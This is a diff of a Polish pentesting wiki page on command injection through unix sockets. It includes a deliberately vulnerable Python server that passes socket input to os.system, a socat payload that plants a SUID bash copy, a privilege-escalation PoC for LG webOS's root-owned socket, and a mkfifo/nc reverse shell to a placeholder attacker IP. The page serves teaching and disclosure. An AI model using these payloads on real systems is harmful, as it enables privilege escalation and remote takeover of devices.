@@ -1,10 +1,8 @@
-# Command Injection przez Socket
+# Socket Command Injection
 
-{{#include ../../banners/hacktricks-training.md}}
+## Przykład wiązania socketu z użyciem Pythona
 
-## Przykład bindowania socketu za pomocą Pythona
-
-W poniższym przykładzie tworzony jest **unix socket** (`/tmp/socket_test.s`), a wszystko, co zostanie **odebrane**, zostanie **wykonane** przez `os.system`. Wiem, że raczej nie znajdziesz czegoś takiego w środowisku produkcyjnym, ale celem tego przykładu jest pokazanie, jak wygląda kod korzystający z unix socketów oraz jak obsługiwać dane wejściowe w najgorszym możliwym przypadku.
+W poniższym przykładzie tworzony jest **unix socket** (`/tmp/socket_test.s`), a wszystko, co zostanie **odebrane**, zostanie **wykonane** przez `os.system`. Wiem, że raczej nie znajdziesz tego w środowisku produkcyjnym, ale celem tego przykładu jest pokazanie, jak wygląda kod korzystający z unix socketów oraz jak obsługiwać dane wejściowe w najgorszym możliwym przypadku.
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +24,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**Wykonaj** kod za pomocą `python s.py` i **sprawdź, jak socket nasłuchuje**:
+**Wykonaj** kod za pomocą python: `python s.py` i **sprawdź, jak socket nasłuchuje**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -37,16 +35,19 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## Studium przypadku: eskalacja wywoływana sygnałem przez root-owned UNIX socket (LG webOS)
+## Studium przypadku: eskalacja wywoływana sygnałem przez należący do root UNIX socket (LG webOS)
 
-Niektóre uprzywilejowane demony udostępniają root-owned UNIX socket, który przyjmuje niezaufane dane wejściowe i łączy uprzywilejowane działania z identyfikatorami wątków oraz sygnałami. Jeśli protokół pozwala nieuprzywilejowanemu klientowi wpływać na to, który native thread jest celem, możesz być w stanie uruchomić uprzywilejowaną ścieżkę kodu i przeprowadzić eskalację.<sup>[[1]](#references)</sup>
+Niektóre uprzywilejowane daemony udostępniają należący do root UNIX socket, który akceptuje niezaufane dane wejściowe i wiąże uprzywilejowane działania z identyfikatorami wątków oraz sygnałami. Jeśli protokół pozwala nieuprzywilejowanemu klientowi wpływać na to, który natywny wątek zostanie wybrany, może być możliwe wywołanie uprzywilejowanej ścieżki kodu i eskalacja uprawnień.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Zaobserwowany wzorzec:
-- Połącz się z root-owned socketem (np. /tmp/remotelogger).
-- Utwórz wątek i uzyskaj jego native thread id (TID).
-- Wyślij TID (spakowany) wraz z paddingiem jako żądanie; odbierz potwierdzenie.
-- Dostarcz określony sygnał do tego TID, aby uruchomić uprzywilejowane działanie.
+Główny opis oraz disclosure przedstawiają następującą sekwencję.<sup>[[1]](#references)[[2]](#references)</sup>
 
+Zaobserwowany schemat:
+- Połącz się z należącym do root socketem (np. /tmp/remotelogger).
+- Utwórz wątek i uzyskaj jego natywny identyfikator wątku (TID).
+- Wyślij TID (spakowany) wraz z dopełnieniem jako żądanie; odbierz potwierdzenie.
+- Dostarcz określony sygnał do tego TID, aby wywołać uprzywilejowane działanie.
+
+Skrócony PoC poniżej odzwierciedla tę sekwencję.<sup>[[1]](#references)[[2]](#references)</sup>
 Minimalny szkic PoC:
 ```python
 import socket, struct, os, threading, time
@@ -59,17 +60,16 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-Aby przekształcić to w powłokę roota, można użyć prostego wzorca named-pipe + nc:
+Aby uzyskać root shell, można użyć prostego wzorca named-pipe + nc.<sup>[[2]](#references)</sup>
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-Uwagi:
-- Ta klasa błędów wynika z zaufania do wartości pochodzących z nieuprzywilejowanego stanu klienta (TID) i wiązania ich z uprzywilejowanymi handlerami sygnałów lub logiką.
-- Wzmocnij zabezpieczenia, wymuszając uwierzytelnianie na socket, sprawdzając formaty wiadomości i oddzielając uprzywilejowane operacje od dostarczanych z zewnątrz identyfikatorów wątków.
+- Ta klasa błędów wynika z ufania wartościom pochodzącym ze stanu klienta bez uprawnień (TIDs) i wiązania ich z uprzywilejowanymi handlerami sygnałów lub logiką.<sup>[[1]](#references)</sup>
+- Wzmocnij zabezpieczenia, wymuszając uwierzytelnianie poświadczeń na socket, sprawdzając formaty wiadomości oraz oddzielając uprzywilejowane operacje od dostarczanych z zewnątrz identyfikatorów wątków.
 
-## Referencje
+## References
 
-- [1] [LG WebOS TV: Path Traversal, Authentication Bypass i pełne przejęcie urządzenia (ujawnienie przez SSD)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
-
+- [1] [Jailbreak webOS dla zabawy (tylko dla zabawy)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
+- [2] [LG WebOS TV: Path Traversal, obejście uwierzytelniania i pełne przejęcie urządzenia (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 {{#include ../../banners/hacktricks-training.md}}
